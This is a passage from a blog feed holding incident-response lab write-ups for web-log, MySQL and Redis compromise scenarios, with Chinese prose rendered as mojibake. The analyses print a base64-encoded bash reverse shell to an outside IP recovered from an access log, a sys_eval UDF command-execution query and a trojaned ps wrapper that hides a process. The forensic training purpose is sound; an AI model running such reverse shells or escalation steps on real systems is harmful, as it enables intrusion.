sort:å¯¹è¾“å‡ºå†…å®¹æ’åº</span><br><span class="hljs-comment"># -r:æŒ‰ç…§é™åºæ’åˆ—</span><br><span class="hljs-comment"># -n:æŒ‰ç…§æ•°å€¼å¤§å°æ’åº</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/005c5ee5274ca0e8.png"></p><p>æ‹¿åˆ° IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>çŸ¥é“ IP äº†ï¼Œç›´æ¥è¿‡æ»¤å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/aa8d17cf8a9d9a44.png"></p><p>æ‰¾åˆ°æŒ‡çº¹</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span><br></code></pre></td></tr></table></figure><p>md5 åŠ å¯†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2</span>d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>åŒç†ï¼Œè¿‡æ»¤å‡º <code>index.php</code> æ–‡ä»¶ï¼Œ<code>wc -l</code>åˆ—å‡ºæ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">27</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>æŒ‰ç…§ IP  è¿‡æ»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;192.168.200.2&quot;</span> access.log.1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f1 | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b7f23942d9639a77.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">6555</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>æŒ‰ç…§æ—¶é—´è¿‡æ»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f1 | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5a6b47c2b00b4c78.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="mysql-åº”æ€¥å“åº”"><a href="#mysql-åº”æ€¥å“åº”" class="headerlink" title="mysql åº”æ€¥å“åº”"></a>mysql åº”æ€¥å“åº”</h1><h2 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mysqlåº”æ€¥å“åº” sshè´¦å· root  å¯†ç  xjmysql<br>ssh env<span class="hljs-selector-class">.xj</span><span class="hljs-selector-class">.edisec</span><span class="hljs-selector-class">.net</span>  -<span class="hljs-selector-tag">p</span> xxxxx<br><span class="hljs-number">1</span>.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag&#123;å…³é”®å­—ç¬¦ä¸²&#125; <br><span class="hljs-number">2</span>.é»‘å®¢åå¼¹shellçš„ip flag&#123;ip&#125;<br><span class="hljs-number">3</span>.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125; æ³¨ /xxx/xxx/xxx/xxx/xxx<span class="hljs-selector-class">.xx</span><br><span class="hljs-number">4</span>.é»‘å®¢è·å–çš„æƒé™ flag&#123;whoamiåçš„å€¼&#125;<br></code></pre></td></tr></table></figure><h2 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h2><p>å†™å…¥çš„ shell ä¸€èˆ¬åœ¨ web ç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¿›å…¥ <code>/var/www/html</code> æŸ¥çœ‹ï¼ŒæŸ¥çœ‹å¯ç–‘æ–‡ä»¶ <code>sh.php</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/7c6078e78f8d08c6.png"></p><p>æ‰¾åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ccfda79e-<span class="hljs-number">7</span>aa1-<span class="hljs-number">4275</span>-bc26-a6189eb9a20b&#125;<br></code></pre></td></tr></table></figure><p>è€Œä¸”å¯ä»¥å‘ç°æ³¨å…¥ç‚¹ä¸ºæ•°æ®åº“è¡¨çš„ç¬¬ä¸‰ä¸ªå­—æ®µ</p><h2 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h2><p>åå¼¹ shell å¯ä»¥çœ‹æ—¥å¿—ï¼Œè¿›å…¥ <code>/var/log</code> ç›®å½•ä¸‹çœ‹æ—¥å¿—ï¼Œè¿›å…¥ <code>apache2</code> æŸ¥çœ‹ <code>access.log</code>ï¼Œèƒ½çœ‹è§å¦‚ä¸‹ä¸€æ¡æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">192.168.200.2 - - [01/Aug/2023:02:18:18 +0000] &quot;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B HTTP/1.1&quot; 200 4025 &quot;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;<br></code></pre></td></tr></table></figure><p>url è§£ç ä¹‹åå¾—åˆ°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;echo YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx|base64 -d&#x27;</span>);<br></code></pre></td></tr></table></figure><p>base64 è§£ç å¾—åˆ°åå¼¹ shell è¯­å¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h2><p>èƒ½ææƒè¯´æ˜å·²ç»æ˜¯è¿æ¥ä¸Šäº†ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹ä¸è´¦å·æœ‰å…³çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7ecfaf23490aa467.png"></p><p>ç¬¬ä¸€æ¡æ˜¾ç¤ºäº†è´¦å·å¯†ç </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;334cc35b3c704593&quot;,&quot;cms&quot;,&quot;3306&quot;);<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¿æ¥ä¸Š mysqlï¼ŒæŸ¥çœ‹æ˜¯å¦ä¸º UDF ææƒ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;secure_file_priv&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/398721c2edc14fb8.png"></p><p><code>secure_file_priv</code> ä¸ºç©ºï¼Œå› ä¸º <code>secure_file_priv</code> å†³å®šäº†æ˜¯å¦æœ‰ä¸Šä¼ æ–‡ä»¶ç­‰æ“ä½œçš„æƒé™ï¼Œå½“ <code>secure_file_priv</code> ä¸ºç©ºæ—¶å…¶ä¹Ÿå°±è¡¨ç¤ºäº†å¯ä»¥å¯¹ä»»æ„è·¯å¾„è¿›è¡Œæ“ä½œï¼Œå¹¶ä¸”æ˜¯ root è´¦æˆ·ï¼Œæ»¡è¶³äº† UDF ææƒã€‚</p><p>è¿›å…¥ <code>/usr/lib/mysql/plugin</code> ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/lib/mysql/plugin<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d4aa08327ee675f.png"></p><p>å‘ç°äº† <code>udf.so</code> æ–‡ä»¶ï¼Œmd5 åŠ å¯†è·¯å¾„ <code>/usr/lib/mysql/plugin/udf.so</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;b1818bde4e310f3d23f1005<span class="hljs-number">185b973e7</span>&#125;<br></code></pre></td></tr></table></figure><p>UDF ææƒè¯¦è§£ï¼š<a href="https://www.freebuf.com/articles/database/291175.html">ã€æ•°æ®åº“ææƒç³»åˆ—ã€‘â€”ã€Mysql-UDFææƒç¯‡ã€‘</a></p><h2 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h2><p>æŸ¥è¯¢æ•°æ®åº“ä¸­æœ‰å“ªäº›å‡½æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a74176608947258f.png"></p><p>åŒæ ·ä½¿ç”¨æ­¤å‡½æ•°æ‰§è¡Œ <code>whoami</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b692f5b8099f8b85.png"></p><p>æ‹¿åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;mysql&#125;</span><br></code></pre></td></tr></table></figure><h1 id="redis-åº”æ€¥å“åº”"><a href="#redis-åº”æ€¥å“åº”" class="headerlink" title="redis åº”æ€¥å“åº”"></a>redis åº”æ€¥å“åº”</h1><h2 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs armasm">æœåŠ¡å™¨åœºæ™¯æ“ä½œç³»ç»Ÿ Linux<br>æœåŠ¡å™¨è´¦å·å¯†ç  root xjredis<br><br>ä»»åŠ¡ç¯å¢ƒè¯´æ˜<br>    æ³¨ï¼šæ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼<br>    åº”æ€¥å“åº”å·¥ç¨‹å¸ˆå°ç‹æŸäººæ”¶åˆ°å®‰å…¨è®¾å¤‡å‘Šè­¦æœåŠ¡å™¨è¢«æ¤å…¥æ¶æ„æ–‡ä»¶ï¼Œè¯·ä¸Šæœºæ’æŸ¥<br>    <br><span class="hljs-number">1</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ <span class="hljs-built_in">IP</span> ä¸ºå¤šå°‘,å°†é»‘å®¢ <span class="hljs-built_in">IP</span> ä½œä¸º FLAG æäº¤<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶,å°†é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶é‡Œé¢çš„ FLAG æäº¤<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢åå¼¹ shell çš„<span class="hljs-built_in">IP</span> ä¸ºå¤šå°‘,å°†åå¼¹ shell çš„<span class="hljs-built_in">IP</span> ä½œä¸º FLAG æäº¤<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”æº¯æºåˆ†æé»‘å®¢çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä½¿ç”¨çš„å·¥å…·é‡Œçš„å…³é”®å­—ç¬¦ä¸²(flag&#123;é»‘å®¢çš„ç”¨æˆ·-å…³é”®å­—ç¬¦ä¸²&#125; æ³¨å…³é”®å­—ç¬¦ä¸² xxx-xxx-xxx)ã€‚å°†ç”¨æˆ·åå’Œå…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAGæäº¤<br><span class="hljs-number">5</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤,å°†é»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤é‡Œé¢çš„å…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAG æäº¤<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h2><p>è¿›å…¥ <code>/var/log</code> ç›®å½•æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ <code>redis.log</code></p><p>æœ‰ä¸‰ä¸ª IP : 192.168.100.13ï¼Œ192.168.31.55 å’Œ 192.168.100.20</p><p>è€Œ IP 192.168.100.13 è¿›è¡Œäº† <code>MASTER &lt;-&gt; REPLICA sync started</code> ä¸»ä»å¤åˆ¶æ”»å‡»ï¼Œä½†æ”»å‡»å¤±è´¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/3dc650c4f2f9fc84.png"></p><p>192.168.31.55 å¹¶æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸º</p><p><img src="https://img.dkdun.cn/v1/2025/12/ce557a216b22426f.png"></p><p>åŒæ · 192.168.100.20 ä¹Ÿè¿›è¡Œäº†æ”»å‡»ï¼Œå¹¶ä¸”æˆåŠŸäº†ï¼Œè¿˜æ‰§è¡Œäº†æ¶æ„æ¨¡å—æ“ä½œ <code>Module &#39;system&#39; loaded from ./exp.so</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.20</span>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»ä»å¤åˆ¶æ”»å‡»ï¼Œæ˜¯æŒ‡å°†ä¸€å° Redis æœåŠ¡å™¨çš„æ•°æ®å¤åˆ¶åˆ°å…¶ä»–çš„ Redis æœåŠ¡å™¨ï¼Œæ”»å‡»æœºä¸ºä¸»æœºï¼Œè¢«æ”»å‡»çš„æœºå™¨ä¸ºä»æœºï¼Œåˆ©ç”¨å¤åˆ¶çš„åŠŸèƒ½é€šè¿‡ <code>FULLRESYNC</code> å°†ä¸»æœºä¸Šçš„æ–‡ä»¶åŒæ­¥å¤åˆ¶è‡³ä»æœºä¸Šï¼Œç„¶åå†åˆ©ç”¨ <code>redis4.x/5.x</code> æŒ‡ä»¤å¯ä»¥é€šè¿‡å¤–éƒ¨åŠ è½½çš„ç‰¹æ€§å»åŠ è½½æ¶æ„çš„ so æ–‡ä»¶ï¼Œä»è€Œå®ç°åˆ©ç”¨ redis å®Œæˆææƒ</p><h2 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h2><p>ä»å‰é¢å·²ç»çŸ¥é“äº†æ¶æ„ so æ–‡ä»¶ <code>exp.so</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ce557a216b22426f.png"></p><p>ä»æ ¹ç›®å½•æ‰¾åˆ° <code>exp.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings exp.so | grep <span class="hljs-string">&quot;flag&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a9db1ef51d18e8ad.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;XJ_78f012d7-<span class="hljs-number">42</span>fc-<span class="hljs-number">49</span>a8-<span class="hljs-number">8</span>a8c-e74c87ea109b&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h2><p>æŸ¥çœ‹ <code>syslog.1</code> ç³»ç»Ÿæ—¥å¿—æœ‰ä¸€å †åå¼¹ shell çš„è®°å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/879b605608dcde37.png"></p><p>è¯´æ˜æ”»å‡»è€…å†™äº†è®¡åˆ’ä»»åŠ¡ï¼ŒIP ä¸º <code>192.168.100.20</code>ï¼ŒæŸ¥çœ‹æœ‰æ— å®šæ—¶ä»»åŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/546b6965a386a933.png"></p><p>å®šæ—¶ä»»åŠ¡ä¸­åå¼¹ shell çš„ IP ä¸º <code>192.168.100.13</code> </p><p>æ”»å‡»æœºåˆ‡æ¢äº†å¥½å‡ æ¬¡ IPï¼Œä» 192.168.100.13:8888 åˆ‡æ¢åˆ° 192.168.31.55:8888ï¼Œç„¶åå†åˆ‡æ¢åˆ° 192.168.100.20:8888ï¼Œè¿™é‡Œçš„ flag åªç®—å®šæ—¶ä»»åŠ¡çš„ IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h2><p>ä¸€èˆ¬ ssh ç™»å½•æœ‰ä¸¤ç§ï¼š</p><p>ç”¨æˆ·ç”Ÿæˆä¸€å¯¹ SSH å¯†é’¥å¯¹ï¼ŒåŒ…æ‹¬ç§é’¥å’Œå…¬é’¥ã€‚å…¬é’¥è¢«ä¸Šä¼ å¹¶å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨çš„ç”¨æˆ·è´¦æˆ·ä¸‹çš„ <code>~/.ssh/authorized_keys</code> æ–‡ä»¶ä¸­</p><p>ç›´æ¥ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ç™»å½•</p><p>é‚£è¿™é‡Œå¯ä»¥æŸ¥çœ‹ Redis é…ç½®æˆ–æŸ¥çœ‹ SSH ç™»å½•æ—¥å¿—</p><p>è®¿é—® <code>.ssh</code> ç›®å½•ä¸­çš„ <code>authorized_keys</code> æ–‡ä»¶ï¼ŒåŒ…å«äº† redis çš„å…¬é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">REDIS0009ï¿½      redis-ver5.0.1ï¿½<br>ï¿½edis-bitsï¿½@ï¿½ctimeï¿½tOï¿½dused-memï¿½XU<br> aof-preambleï¿½ï¿½ï¿½xxsshB9<br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user<br><br>ï¿½&lt;#5M<br></code></pre></td></tr></table></figure><p><code>xj-test-user</code> æ˜¯ä¸€ä¸ªç”¨æˆ·åï¼Œæœç´¢æ‰¾åˆ°äº† <a href="https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636">https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/7b8cae845bb7d611.png"></p><p>ç„¶åæ‹¼æ¥</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>&#123;xj-test-user-wow-you-<span class="hljs-built_in">find</span>-<span class="hljs-built_in">flag</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5-1"><a href="#Q5-1" class="headerlink" title="Q5"></a>Q5</h2><p>æ£€æŸ¥ç³»ç»Ÿè·¯å¾„ä¸­çš„å‘½ä»¤ï¼Œåœ¨ <code>/usr/bin</code> æ–‡ä»¶å¤¹ä¸‹æŸ¥çœ‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/cf508bd0ab1819a2.png"></p><p>å‘ç° ps çš„æƒé™ä¸º <code>-rwxrwxrwx</code>ï¼Œæ­£å¸¸æƒé™åº”è¯¥ä¸º <code>-rwxr-xr-x</code>ï¼ŒæŸ¥çœ‹ ps çš„å†…å®¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/bc847e291fd31b47.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;c195i2923381905517d818e<span class="hljs-number">313792d196</span>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹è¿™ä¸ªè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/bin/bash</span><br>oldifs=<span class="hljs-string">&quot;<span class="hljs-variable">$IFS</span>&quot;</span><br>IFS=<span class="hljs-string">&#x27;\$n&#x27;</span><br>result=$(ps_ <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span>|grep -v <span class="hljs-string">&#x27;threadd&#x27;</span> )<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$v</span>\t&quot;</span>;<br><span class="hljs-keyword">done</span><br>IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$oldifs</span>&quot;</span><br></code></pre></td></tr></table></figure><p>è·å– <code>ps_</code> å‘½ä»¤çš„è¾“å‡ºï¼Œå¹¶æŒ‰è¡Œå¤„ç†å’Œè¾“å‡ºç»“æœï¼Œåˆ—å‡ºç³»ç»Ÿä¸­è¿è¡Œçš„è¿›ç¨‹ï¼Œå¹¶è¿‡æ»¤æ‰åŒ…å« <code>threadd</code> å…³é”®å­—çš„è¿›ç¨‹ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªè¿›ç¨‹ç›‘æ§è„šæœ¬ï¼Œæ£€æŸ¥ç‰¹å®šè¿›ç¨‹çš„çŠ¶æ€</p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>ç„æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç„æœº-ç¬¬ä¸€ç« </title>
    <link href="/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <url>/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    
